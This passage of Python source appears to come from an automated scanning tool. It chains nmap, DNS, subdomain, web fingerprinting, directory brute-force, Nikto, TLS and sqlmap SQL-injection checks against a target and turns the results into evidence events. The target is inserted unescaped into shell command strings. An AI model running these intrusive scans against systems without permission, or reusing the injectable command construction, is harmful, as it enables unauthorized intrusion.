    all_output = discovery["stdout"] or ""
    services = parse_nmap_service_lines(all_output)
    if all_output:
        nmap_compact = compact_scan_output(all_output, "nmap", max_lines=10)
        if nmap_compact["details"]:
            events.append({"kind": "log", "severity": "low", "message": " ; ".join(nmap_compact["details"][:5])})

    if not services:
        events.append({"kind": "evidence", "severity": "low", "summary": "No open TCP services detected", "details": ["Target did not answer on the top 1000 TCP ports."], "artifacts": {"scan_type": "staged", "open_ports": []}})
        return events

    open_port_values = [entry["port"] for entry in services]
    open_port_csv = ",".join(open_port_values[:20])
    if profile == "fast":
        deep_cmd = f"nmap -Pn -n -sV --version-light --max-retries 2 -T4 -p {open_port_csv} {target}"
    elif profile == "deep":
        deep_cmd = f"nmap -Pn -n -sC -sV -O --traceroute --version-all --script-timeout 30s --max-retries 3 -T4 -p {open_port_csv} {target}"
    else:
        deep_cmd = f"nmap -Pn -n -sC -sV -O --traceroute --version-light --script-timeout 20s --max-retries 2 -T4 -p {open_port_csv} {target}"
    
    try:
        if job_id:
            safe_append_log(job_id, f"⏳ Running scan 2/2: targeted on {open_port_csv}", "info")
            safe_update_progress(job_id, 50)
    except Exception:
        pass
    events.append({"kind": "log", "severity": "info", "message": f"$ {deep_cmd}"})
    deep_result = execute_command_with_progress(deep_cmd, job_id if job_id else "temp", target, timeout=300)
    if deep_result.get("cancelled"):
        events.append({"kind": "log", "severity": "warning", "message": "Service scan stopped by operator"})
        return events
    if deep_result["success"] and deep_result["stdout"]:
        all_output += "\n" + deep_result["stdout"]
        events.append({"kind": "log", "severity": "low", "message": deep_result["stdout"][:2000]})
        deep_services = parse_nmap_service_lines(deep_result["stdout"])
        if deep_services:
            services = deep_services

    web_ports = web_ports_from_services(services)
    cves = parse_cves(all_output)
    structured_findings = parse_nmap_structured_findings(all_output)
    state_summary = parse_nmap_port_state_summary(all_output)
    metadata = parse_nmap_metadata(all_output, target)
    service_versions = [f"{entry['port']}/{entry['service']} {entry['version']}".strip() for entry in services if entry.get("version")][:12]
    os_hints = unique_text_lines([*infer_os_hints_from_services(services), *metadata.get("os_matches", [])], limit=6)
    database_services = [f"{entry['port']}/{entry['service']} {entry['version']}".strip() for entry in services if re.search(r"mysql|postgres|mongodb|redis|mssql|oracle", str(entry.get("service", "")), flags=re.IGNORECASE)]
    
    if web_ports:
        web_port_csv = ",".join(web_ports)
        web_scripts = "http-title,http-headers,ssl-cert"
        if profile == "deep":
            web_scripts = "http-title,http-headers,ssl-cert,vulners"
        web_cmd = f"nmap -Pn -n --script {web_scripts} -p {web_port_csv} {target}"
        try:
            if job_id:
                safe_append_log(job_id, f"⏳ Running web NSE on {web_port_csv}", "info")
                safe_update_progress(job_id, 70)
        except Exception:
            pass
        events.append({"kind": "log", "severity": "info", "message": f"$ {web_cmd}"})
        web_result = execute_command_with_progress(web_cmd, job_id if job_id else "temp", target, timeout=180)
        if web_result.get("cancelled"):
            events.append({"kind": "log", "severity": "warning", "message": "Service scan stopped by operator"})
            return events
        if web_result["success"] and web_result["stdout"]:
            all_output += "\n" + web_result["stdout"]
            events.append({"kind": "log", "severity": "low", "message": web_result["stdout"][:2000]})
            cves = parse_cves(all_output)
            structured_findings = parse_nmap_structured_findings(all_output)
            metadata = parse_nmap_metadata(all_output, target)

    events.append({
        "kind": "evidence",
        "severity": "critical",
        "summary": f"🔥 {len(services)} open ports discovered",
        "details": summarize_open_ports(services, limit=20),
        "artifacts": {
            "open_ports": services,
            "scan_type": "staged-targeted",
            "web_ports": web_ports,
            "service_versions": service_versions,
            "os_guess": os_hints,
            "cves": cves,
            "nse_findings_structured": structured_findings,
            "host_alive": True,
            "ip_addresses": metadata.get("ip_addresses", [target]),
            "hostnames": metadata.get("hostnames", []),
            "hostname": metadata.get("hostname", ""),
            "mac_addresses": metadata.get("mac_addresses", []),
            "vendors": metadata.get("vendors", []),
            "device_types": metadata.get("device_types", []),
            "os_matches": metadata.get("os_matches", []),
            "latency": metadata.get("latency", ""),
            "network_distance": metadata.get("network_distance", ""),
            "traceroute_hops": metadata.get("traceroute_hops", []),
            "http_titles": metadata.get("http_titles", []),
            "http_headers": metadata.get("http_headers", []),
            "http_methods": metadata.get("http_methods", []),
            "smb_details": metadata.get("smb_details", []),
            "tls_details": metadata.get("tls_details", []),
            "firewall_indicators": unique_text_lines([*metadata.get("firewall_indicators", []), *state_summary.get("state_lines", [])], limit=12),
            "service_misconfigurations": metadata.get("service_misconfigurations", []),
            "closed_count": state_summary.get("closed_count", 0),
            "filtered_count": state_summary.get("filtered_count", 0),
            "database_services": database_services,
        }
    })

    ftp_services = [entry for entry in services if str(entry.get("port")) == "21" or "ftp" in str(entry.get("service", "")).lower()]
    if ftp_services:
        events.extend(review_anonymous_ftp(target))

    mysql_services = [entry for entry in services if str(entry.get("port")) == "3306" or "mysql" in str(entry.get("service", "")).lower()]
    if mysql_services:
        mysql_versions = [f"{entry.get('port')}/{entry.get('service')} {entry.get('version', '').strip()}".strip() for entry in mysql_services]
        events.append({
            "kind": "evidence",
            "severity": "high",
            "summary": "MySQL service exposed on TCP/3306",
            "details": mysql_versions or ["Service MySQL dapat dijangkau dari jaringan."],
            "artifacts": {
                "open_ports": mysql_services,
                "service_versions": mysql_versions,
                "mysql_exposed": True,
            },
        })
    
    try:
        if job_id:
            safe_update_progress(job_id, 90)
            safe_append_log(job_id, "✅ Service scan completed", "info")
    except Exception:
        pass
    
    return events

def real_host_discovery(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    
    try:
        if job_id:
            safe_append_log(job_id, "🔍 Starting host discovery...", "info")
            safe_update_progress(job_id, 10)
    except Exception:
        pass
    
    events.append({"kind": "log", "severity": "warning", "message": f"🔥 Running host discovery ({profile})"})
    
    if shutil.which("ping"):
        cmd = f"ping -c 1 -W 2 {target}"
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=10)
        if result["success"]:
            events.append({"kind": "log", "severity": "info", "message": f"✅ Host {target} is reachable via ping"})
            events.append({"kind": "evidence", "severity": "low", "summary": f"Host {target} is alive", "details": ["Host responded to ICMP ping"], "artifacts": {"ping_result": result["stdout"][:500], "host_alive": True}})
        else:
            events.append({"kind": "log", "severity": "warning", "message": f"⚠️ Host {target} did not respond to ping"})
    
    if check_tool_availability("nmap"):
        if profile == "fast":
            cmd = f"nmap -sn -n {target}"
        elif profile == "deep":
            cmd = f"nmap -sn -n {target} && nmap -Pn -n -PS22,80,443 -PA80,443 {target}"
        else:
            cmd = f"nmap -sn -n {target}"
        
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=60)
        if result["success"]:
            events.append({"kind": "log", "severity": "low", "message": result["stdout"][:1000]})
            if "Host is up" in result["stdout"]:
                metadata = parse_nmap_metadata(result["stdout"], target)
                events.append({
                    "kind": "evidence",
                    "severity": "low",
                    "summary": "Nmap host discovery completed",
                    "details": ["Host is up according to nmap"],
                    "artifacts": {
                        "nmap_output": result["stdout"][:2000],
                        "host_alive": True,
                        "ip_addresses": metadata.get("ip_addresses", [target]),
                        "hostnames": metadata.get("hostnames", []),
                        "hostname": metadata.get("hostname", ""),
                        "mac_addresses": metadata.get("mac_addresses", []),
                        "vendors": metadata.get("vendors", []),
                        "latency": metadata.get("latency", ""),
                    },
                })
    
    if job_id:
        safe_update_progress(job_id, 90)
        safe_append_log(job_id, "✅ Host discovery completed", "info")
    
    return events

def real_dns_enumeration(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    
    try:
        if job_id:
            safe_append_log(job_id, "🔍 Starting DNS enumeration...", "info")
            safe_update_progress(job_id, 10)
    except Exception:
        pass
    
    events.append({"kind": "log", "severity": "warning", "message": f"🔥 Running DNS enumeration ({profile})"})
    
    domain = target if "." in target else f"{target}.lab.local"
    
    try:
        ip = socket.gethostbyname(target)
        events.append({"kind": "log", "severity": "info", "message": f"DNS resolved {target} -> {ip}"})
    except Exception as e:
        events.append({"kind": "log", "severity": "warning", "message": f"DNS resolution failed: {e}"})
    
    if profile != "fast" and check_tool_availability("dig"):
        if profile == "fast":
            cmd = f"dig {domain} A +short"
        elif profile == "deep":
            cmd = f"dig {domain} ANY +short && dig -x {target} +short"
        else:
            cmd = f"dig {domain} A +short && dig -x {target} +short"
        
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=30)
        if result["success"] and result["stdout"]:
            records = parse_dns_record_lines(result["stdout"])
            events.append({"kind": "evidence", "severity": "low", "summary": "DNS records discovered", "details": records[:10], "artifacts": {"dig_output": result["stdout"][:2000], "dns_records": records}})
    
    if check_tool_availability("dnsx"):
        cmd = f"dnsx -silent -resp -a -ptr {target}"
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=60)
        if result["success"] and result["stdout"]:
            records = parse_dns_record_lines(result["stdout"])
            events.append({"kind": "evidence", "severity": "medium", "summary": "DNSx enumeration completed", "details": records[:10], "artifacts": {"dnsx_output": result["stdout"][:2000], "dns_records": records}})
    
    if job_id:
        safe_update_progress(job_id, 90)
        safe_append_log(job_id, "✅ DNS enumeration completed", "info")
    
    return events

def real_amass_expansion(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    
    try:
        if job_id:
            safe_append_log(job_id, "🔍 Starting Amass expansion...", "info")
            safe_update_progress(job_id, 10)
    except Exception:
        pass
    
    if not check_tool_availability("amass"):
        events.append({"kind": "log", "severity": "warning", "message": "❌ amass not found - skipping"})
        return events

    if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", str(target).strip()):
        events.append({"kind": "log", "severity": "info", "message": "Amass expansion skipped because target is IP-only scope."})
        return events
    
    domain = target if "." in target else f"{target}.lab.local"
    events.append({"kind": "log", "severity": "warning", "message": f"🔥 Running Amass on {domain} ({profile})"})
    
    output_file = Path(f"amass_{target}.txt")
    if profile == "fast":
        cmd = f"amass enum -passive -d {domain} -o {output_file}"
    elif profile == "deep":
        cmd = f"amass enum -brute -src -d {domain} -o {output_file}"
    else:
        cmd = f"amass enum -passive -d {domain} -o {output_file}"
    
    result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=300 if profile == "deep" else 180)
    if result["success"]:
        output_lines = [line.strip() for line in result.get("stdout", "").splitlines() if line.strip() and "." in line]
        if output_file.exists():
            try:
                output_lines.extend([line.strip() for line in output_file.read_text(encoding="utf-8", errors="ignore").splitlines() if line.strip() and "." in line])
            except OSError:
                pass
        subdomains = []
        seen: set[str] = set()
        for line in output_lines:
            lowered = line.lower()
            if lowered in seen:
                continue
            seen.add(lowered)
            subdomains.append(line)
        if subdomains:
            events.append({"kind": "evidence", "severity": "high", "summary": f"🔥 {len(subdomains)} subdomains discovered", "details": subdomains[:30], "artifacts": {"subdomains": subdomains, "command": cmd}})
    
    if job_id:
        safe_update_progress(job_id, 90)
        safe_append_log(job_id, "✅ Amass expansion completed", "info")
    
    return events

def real_web_fingerprint(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    candidate_urls = discovered_web_targets(job_id, target)
    primary_url = candidate_urls[0].rstrip("/")
    reuse_targets_note = f"Reusing discovery targets: {', '.join(candidate_urls[:3])}"
    
    try:
        if job_id:
            safe_append_log(job_id, "🔍 Fingerprinting web...", "info")
            safe_update_progress(job_id, 20)
            safe_append_log(job_id, f"Reusing discovery targets: {', '.join(candidate_urls[:3])}", "info")
    except Exception:
        pass
    
    if check_tool_availability("httpx"):
        if profile == "fast":
            cmd = f"httpx -u {primary_url} -status-code -title -silent -timeout 10"
        elif profile == "deep":
            cmd = f"httpx -u {primary_url} -status-code -title -tech-detect -tls-probe -web-server -server -silent -timeout 15"
        else:
            cmd = f"httpx -u {primary_url} -status-code -title -tech-detect -tls-probe -silent -timeout 12"
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=60 if profile != "deep" else 90)
        if result.get("cancelled"):
            events.append({"kind": "log", "severity": "warning", "message": "Web fingerprint stopped by operator"})
            return events
        if result["success"] and result["stdout"]:
            httpx_structured = parse_httpx_structured_lines(result["stdout"])
            events.append({"kind": "evidence", "severity": "medium", "summary": "Web technology detected", "details": unique_text_lines(httpx_structured["lines"] or [result["stdout"].strip()], limit=12), "artifacts": {"httpx_output": "\n".join(httpx_structured["lines"][:12]), "service_versions": httpx_structured["technologies"], "http_observations": httpx_structured["lines"]}})
    
    if job_id:
        safe_update_progress(job_id, 60)
    
    if profile != "fast" and check_tool_availability("whatweb"):
        aggression = 1 if profile == "fast" else 4 if profile == "deep" else 3
        cmd = f"whatweb -a {aggression} {primary_url} -v --no-errors"
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=90 if profile == "fast" else 180 if profile == "deep" else 120)
        if result.get("cancelled"):
            events.append({"kind": "log", "severity": "warning", "message": "Web fingerprint stopped by operator"})
            return events
        if result["success"] and result["stdout"]:
            whatweb_components = parse_whatweb_components(result["stdout"])
            events.append({"kind": "evidence", "severity": "medium", "summary": "Whatweb fingerprint", "details": unique_text_lines([line for line in result["stdout"].split("\n") if line.strip()], limit=10), "artifacts": {"whatweb_output": "\n".join(unique_text_lines([line for line in result["stdout"].split("\n") if line.strip()], limit=12)), "service_versions": whatweb_components}})
    
    if job_id:
        safe_update_progress(job_id, 90)
        safe_append_log(job_id, "✅ Web fingerprint completed", "info")
    
    return events

def real_web_security_header_audit(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    candidate_urls = discovered_web_targets(job_id, target)
    primary_url = candidate_urls[0].rstrip("/")
    timeout = 10 if profile == "fast" else 15 if profile == "deep" else 12
    command = f"python3 /app/backend/wahidin_check_headers.py {primary_url} --timeout {timeout}"

    try:
        if job_id:
            safe_append_log(job_id, "Starting web security header audit...", "info")
            safe_update_progress(job_id, 15)
            safe_append_log(job_id, f"Reusing discovery targets: {', '.join(candidate_urls[:3])}", "info")
    except Exception:
        pass

    events.append({"kind": "log", "severity": "warning", "message": f"Running web security header audit ({profile})"})
    events.append({"kind": "log", "severity": "info", "message": f"$ {command}"})

    try:
        result = wahidin_check_headers(primary_url, timeout)
    except Exception as error:
        events.append({"kind": "log", "severity": "warning", "message": f"Header audit failed: {error}"})
        return events

    try:
        if job_id:
            safe_update_progress(job_id, 80)
    except Exception:
        pass

    present_lines = [
        f"Header present: {item['name']} => {item['value']}"
        for item in result.get("present_headers", [])[:8]
    ]
    missing_lines = [
        f"Missing {item['name']} ({item['risk']}): {item['recommendation']}"
        for item in result.get("missing_headers", [])
    ]
    details = [
        f"Checked URL: {result.get('target_url')}",
        f"Final URL: {result.get('final_url')}",
        f"HTTP status: {result.get('status_code')}",
        f"Security score: {result.get('score')}/{result.get('total_headers')}",
        f"Overall risk: {result.get('overall_risk')}",
        *missing_lines,
        *present_lines,
    ]

    missing_headers = result.get("missing_headers", [])
    summary = f"Security headers review: {len(missing_headers)} missing of {result.get('total_headers')}"
    severity = str(result.get("overall_severity") or "info").lower()
    if not missing_headers:
        summary = f"Security headers review: all {result.get('total_headers')} monitored headers present"
        severity = "info"

    events.append(
        {
            "kind": "evidence",
            "severity": severity,
            "summary": summary,
            "details": details[:30],
            "artifacts": {
                "command": command,
                "checked_url": result.get("target_url"),
                "final_url": result.get("final_url"),
                "status_code": result.get("status_code"),
                "header_score": result.get("score"),
                "total_headers": result.get("total_headers"),
                "overall_risk": result.get("overall_risk"),
                "missing_headers": [item["name"] for item in missing_headers],
                "security_headers": missing_lines,
                "present_headers": [item["name"] for item in result.get("present_headers", [])],
            },
        }
    )

    try:
        if job_id:
            safe_update_progress(job_id, 95)
            safe_append_log(job_id, "Web security header audit completed", "info")
    except Exception:
        pass

    return events

def real_content_discovery(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    candidate_urls = discovered_web_targets(job_id, target)
    primary_url = candidate_urls[0].rstrip("/")
    
    try:
        if job_id:
            safe_append_log(job_id, "🔍 Starting content discovery...", "info")
            safe_update_progress(job_id, 20)
    except Exception:
        pass
    
    wordlist = preferred_small_web_wordlist()
    
    if job_id:
        safe_append_log(job_id, f"📂 Using wordlist: {wordlist}", "info")
    
    if job_id:
        safe_append_log(job_id, f"Reusing discovery targets: {', '.join(candidate_urls[:3])}", "info")

    if check_tool_availability("ffuf"):
        if job_id:
            safe_append_log(job_id, f"🔥 Running ffuf ({profile})...", "warning")
            safe_update_progress(job_id, 40)

        if profile == "fast":
            cmd = f"ffuf -u {primary_url}/FUZZ -w {wordlist} -mc 200,301,302,403 -fc 404 -t 20 -timeout 8 -s -of json -o ffuf_{target}.json"
        elif profile == "deep":
            cmd = f"ffuf -u {primary_url}/FUZZ -w {wordlist} -mc 200,204,301,302,307,401,403 -fc 404 -t 40 -timeout 12 -s -of json -o ffuf_{target}.json"
        else:
            cmd = f"ffuf -u {primary_url}/FUZZ -w {wordlist} -mc 200,301,302,403 -fc 404 -t 30 -timeout 10 -s -of json -o ffuf_{target}.json"

        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=300 if profile != "deep" else 420, capture_output=False)
        if result.get("cancelled"):
            events.append({"kind": "log", "severity": "warning", "message": "Content discovery stopped by operator"})
            return events
        
        if result["success"]:
            json_file = Path(f"ffuf_{target}.json")
            if json_file.exists():
                try:
                    with open(json_file) as f:
                        data = json.load(f)
                        entries = parse_ffuf_result_entries(data)
                        paths = [entry["path"] for entry in entries[:30]]
                        if entries:
                            events.append({"kind": "evidence", "severity": "high", "summary": f"🔥 {len(entries)} paths discovered", "details": summarize_ffuf_entries(entries, limit=30), "artifacts": {"paths": paths, "dir_entries": entries, "exposed_files": detect_sensitive_paths(entries)}})
                except Exception:
                    pass

    events.extend(review_web_exposure_from_hints(target, candidate_urls))
    
    if job_id:
        safe_update_progress(job_id, 80)
        safe_append_log(job_id, "✅ Content discovery completed", "info")
    
    return events

def real_nikto_review(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    
    try:
        if job_id:
            safe_append_log(job_id, "🔍 Starting Nikto review...", "info")
            safe_update_progress(job_id, 10)
    except Exception:
        pass
    
    if not check_tool_availability("nikto"):
        events.append({"kind": "log", "severity": "warning", "message": "❌ nikto not found - skipping"})
        return events
    
    events.append({"kind": "log", "severity": "warning", "message": f"🔥 Running Nikto scan ({profile})"})
    
    if profile == "fast":
        cmd = f"nikto -h http://{target} -nointeractive -Tuning b -timeout 10"
    elif profile == "deep":
        cmd = f"nikto -h http://{target} -nointeractive -Tuning 123b -timeout 20"
    else:
        cmd = f"nikto -h http://{target} -nointeractive -timeout 15"
    
    result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=180 if profile == "deep" else 120)
    if result["success"] and result["stdout"]:
        findings = []
        for raw_line in result["stdout"].splitlines():
            line = raw_line.strip()
            if not line:
                continue
            # Keep only actionable Nikto findings, not banners or timing noise.
            if line.startswith("+ ") or line.startswith("! "):
                findings.append(line)

        findings = unique_text_lines(findings, limit=30)
        if findings:
            events.append({
                "kind": "evidence",
                "severity": "high",
                "summary": f"🔥 {len(findings)} Nikto findings",
                "details": findings[:20],
                "artifacts": {
                    "nikto_findings": findings,
                    "nikto_output": "\n".join(findings[:40]),
                    "command": cmd,
                },
            })
    
    if job_id:
        safe_update_progress(job_id, 90)
        safe_append_log(job_id, "✅ Nikto review completed", "info")
    
    return events

def real_gobuster_routes(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    base_url = f"http://{target}"
    
    try:
        if job_id:
            safe_append_log(job_id, "🔍 Starting Gobuster routes...", "info")
            safe_update_progress(job_id, 10)
    except Exception:
        pass
    
    if not check_tool_availability("gobuster"):
        events.append({"kind": "log", "severity": "warning", "message": "❌ gobuster not found - skipping"})
        return events
    
    wordlist = preferred_small_web_wordlist()
    events.append({"kind": "log", "severity": "warning", "message": f"🔥 Running Gobuster directory scan ({profile})"})
    
    if profile == "fast":
        cmd = build_gobuster_dir_command(base_url, wordlist, threads=20, wildcard=True)
    elif profile == "deep":
        cmd = build_gobuster_dir_command(base_url, wordlist, threads=30, extensions="php,txt,bak,zip", wildcard=True)
    else:
        cmd = build_gobuster_dir_command(base_url, wordlist, threads=25, wildcard=True)
    
    result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=180 if profile == "deep" else 120)
    if not result["success"]:
        exclude_length = extract_gobuster_exclude_length(result.get("stderr", ""))
        if exclude_length is not None:
            retry_cmd = build_gobuster_dir_command(
                base_url,
                wordlist,
                threads=30 if profile == "deep" else (20 if profile == "fast" else 25),
                extensions="php,txt,bak,zip" if profile == "deep" else "",
                exclude_length=exclude_length,
            )
            events.append({
                "kind": "log",
                "severity": "warning",
                "message": f"Gobuster wildcard detected. Retrying with --exclude-length {exclude_length}.",
            })
            result = execute_command_with_progress(retry_cmd, job_id if job_id else "temp", target, timeout=180 if profile == "deep" else 120)
            cmd = retry_cmd
    if result["success"] and result["stdout"]:
        entries = parse_gobuster_result_entries(result["stdout"])
        if entries:
            paths = [f"/{entry['path']} (Status: {entry['status']})" for entry in entries]
            events.append({
                "kind": "evidence",
                "severity": "high",
                "summary": f"🔥 {len(entries)} routes discovered",
                "details": summarize_ffuf_entries(entries, limit=30),
                "artifacts": {
                    "routes": paths,
                    "dir_entries": entries,
                    "exposed_files": detect_sensitive_paths(entries),
                    "command": cmd,
                },
            })
    
    if job_id:
        safe_update_progress(job_id, 90)
        safe_append_log(job_id, "✅ Gobuster routes completed", "info")
    
    return events

def real_route_enumeration_light(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    candidate_urls = discovered_web_targets(job_id, target)
    primary_url = candidate_urls[0].rstrip("/")

    try:
        if job_id:
            safe_append_log(job_id, "Starting route enumeration...", "info")
            safe_append_log(job_id, f"Reusing discovery targets: {', '.join(candidate_urls[:3])}", "info")
            safe_update_progress(job_id, 10)
            safe_append_log(job_id, f"Reusing discovery targets: {', '.join(candidate_urls[:3])}", "info")
            safe_append_log(job_id, f"Reusing discovery targets: {', '.join(candidate_urls[:3])}", "info")
    except Exception:
        pass

    wordlist = preferred_small_web_wordlist()
    prefer_ffuf = profile in {"fast", "balanced"}

    if prefer_ffuf and check_tool_availability("ffuf"):
        events.append({"kind": "log", "severity": "warning", "message": f"Running lightweight route enumeration with ffuf ({profile})"})
        if profile == "fast":
            cmd = f"ffuf -u {primary_url}/FUZZ -w {wordlist} -ac -mc 200,301,302,403 -t 20 -timeout 8 -s -of json -o ffuf-routes-{target}.json"
        else:
            cmd = f"ffuf -u {primary_url}/FUZZ -w {wordlist} -ac -mc 200,301,302,403 -t 25 -timeout 10 -s -of json -o ffuf-routes-{target}.json"
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=120, capture_output=False)
        if result.get("cancelled"):
            events.append({"kind": "log", "severity": "warning", "message": "Route enumeration stopped by operator"})
            return events
        if result["success"]:
            json_file = Path(f"ffuf-routes-{target}.json")
            if json_file.exists():
                try:
                    with open(json_file, encoding="utf-8", errors="ignore") as f:
                        data = json.load(f)
                    entries = parse_ffuf_result_entries(data)
                    if entries:
                        paths = [f"/{entry['path']} (Status: {entry['status']})" for entry in entries]
                        events.append({
                            "kind": "evidence",
                            "severity": "high",
                            "summary": f"{len(entries)} routes discovered",
                            "details": summarize_ffuf_entries(entries, limit=30),
                            "artifacts": {
                                "routes": paths,
                                "dir_entries": entries,
                                "exposed_files": detect_sensitive_paths(entries),
                                "command": cmd,
                                "tool_selected": "ffuf",
                            },
                        })
                except Exception as error:
                    events.append({"kind": "log", "severity": "warning", "message": f"Failed parsing ffuf route results: {error}"})
        if job_id:
            safe_update_progress(job_id, 90)
            safe_append_log(job_id, "Route enumeration completed", "info")
        return events

    if check_tool_availability("gobuster"):
        events.append({"kind": "log", "severity": "warning", "message": f"Running deep route enumeration with gobuster ({profile})"})
        cmd = build_gobuster_dir_command(primary_url, wordlist, threads=30, extensions="php,txt,bak,zip", wildcard=True)
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=180)
        if result.get("cancelled"):
            events.append({"kind": "log", "severity": "warning", "message": "Route enumeration stopped by operator"})
            return events
        if not result["success"]:
            exclude_length = extract_gobuster_exclude_length(result.get("stderr", ""))
            if exclude_length is not None:
                retry_cmd = build_gobuster_dir_command(
                    primary_url,
                    wordlist,
                    threads=30,
                    extensions="php,txt,bak,zip",
                    exclude_length=exclude_length,
                )
                events.append({
                    "kind": "log",
                    "severity": "warning",
                    "message": f"Gobuster wildcard detected. Retrying with --exclude-length {exclude_length}.",
                })
                result = execute_command_with_progress(retry_cmd, job_id if job_id else "temp", target, timeout=180)
                cmd = retry_cmd
        if result["success"] and result["stdout"]:
            entries = parse_gobuster_result_entries(result["stdout"])
            if entries:
                paths = [f"/{entry['path']} (Status: {entry['status']})" for entry in entries]
                events.append({
                    "kind": "evidence",
                    "severity": "high",
                    "summary": f"{len(entries)} routes discovered",
                    "details": summarize_ffuf_entries(entries, limit=30),
                    "artifacts": {
                        "routes": paths,
                        "dir_entries": entries,
                        "exposed_files": detect_sensitive_paths(entries),
                        "command": cmd,
                        "tool_selected": "gobuster",
                    },
                })
        if job_id:
            safe_update_progress(job_id, 90)
            safe_append_log(job_id, "Route enumeration completed", "info")
        return events

    events.append({"kind": "log", "severity": "warning", "message": "Neither ffuf nor gobuster is available - skipping route enumeration"})
    return events

def real_tls_dns_review(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    
    try:
        if job_id:
            safe_append_log(job_id, "🔍 Starting TLS/DNS review...", "info")
            safe_update_progress(job_id, 10)
    except Exception:
        pass
    
    events.append({"kind": "log", "severity": "warning", "message": f"🔥 Running TLS/DNS review ({profile})"})
    
    try:
        import ssl
        context = ssl.create_default_context()
        with socket.create_connection((target, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=target) as secure_sock:
                cert = secure_sock.getpeercert()
                tls_version = secure_sock.version() or "unknown"
                cipher = secure_sock.cipher()[0] if secure_sock.cipher() else "unknown"
                
                tls_findings = [f"TLS Version: {tls_version}", f"Cipher: {cipher}", f"Certificate: {cert.get('subject', 'unknown')}"]
                events.append({"kind": "evidence", "severity": "medium", "summary": "TLS endpoint information", "details": tls_findings, "artifacts": {"tls_version": tls_version, "cipher": cipher, "tls_findings": tls_findings}})
    except Exception as e:
        events.append({"kind": "log", "severity": "warning", "message": f"TLS check failed: {e}"})
    
    if check_tool_availability("sslyze") and profile != "fast":
        cmd = f"sslyze --regular {target}:443"
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=60)
        if result["success"]:
            highlights = extract_interesting_lines(result["stdout"], [r"accepted", r"rejected", r"tls", r"ssl", r"cipher", r"certificate", r"vulnerab"], limit=12)
            events.append({"kind": "evidence", "severity": "medium", "summary": "SSLyze scan results", "details": highlights or [line for line in result["stdout"].split("\n") if line.strip()][:10], "artifacts": {"sslyze_output": result["stdout"][:2000], "tls_findings": highlights}})
    
    if check_tool_availability("openssl"):
        cmd = f"openssl s_client -connect {target}:443 -servername {target} -tls1_2 < /dev/null 2>/dev/null | openssl x509 -noout -text"
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=30)
        if result["success"] and result["stdout"]:
            certificate_details = [line.strip() for line in result["stdout"].split("\n") if "Subject:" in line or "Issuer:" in line or "Not Before" in line or "Not After" in line]
            events.append({"kind": "evidence", "severity": "low", "summary": "SSL certificate details", "details": certificate_details, "artifacts": {"certificate": result["stdout"][:2000], "certificate_details": certificate_details}})
    
    if job_id:
        safe_update_progress(job_id, 90)
        safe_append_log(job_id, "✅ TLS/DNS review completed", "info")
    
    return events

def real_sql_validation(target: str, job_id: str = "", execution_profile: str = "balanced") -> list[dict[str, Any]]:
    events: list[dict[str, Any]] = []
    profile = normalize_execution_profile(execution_profile)
    candidate_urls = discovered_web_targets(job_id, target)
    primary_url = candidate_urls[0].rstrip("/")
    
    try:
        if job_id:
            safe_append_log(job_id, "🔍 Starting SQL validation...", "info")
            safe_update_progress(job_id, 10)
    except Exception:
        pass
    
    if not check_tool_availability("sqlmap"):
        events.append({"kind": "log", "severity": "warning", "message": "❌ sqlmap not found - skipping"})
        return events
    
    events.append({"kind": "log", "severity": "critical", "message": f"🔥 Running SQL injection test ({profile})"})
    
    params = ["id", "q", "page", "user", "cat"]
    param_limit = 1 if profile == "fast" else 2 if profile == "balanced" else 4
    for param in params[:param_limit]:
        if profile == "fast":
            cmd = f"sqlmap -u {primary_url}/?{param}=1 --batch --risk=1 --level=1 --timeout=10"
        elif profile == "deep":
            cmd = f"sqlmap -u {primary_url}/?{param}=1 --batch --risk=3 --level=3 --threads=4 --timeout=30"
        else:
            cmd = f"sqlmap -u {primary_url}/?{param}=1 --batch --risk=2 --level=2 --timeout=20"
        
        result = execute_command_with_progress(cmd, job_id if job_id else "temp", target, timeout=180 if profile == "deep" else 120)
        if result["success"] and "vulnerable" in result["stdout"].lower():
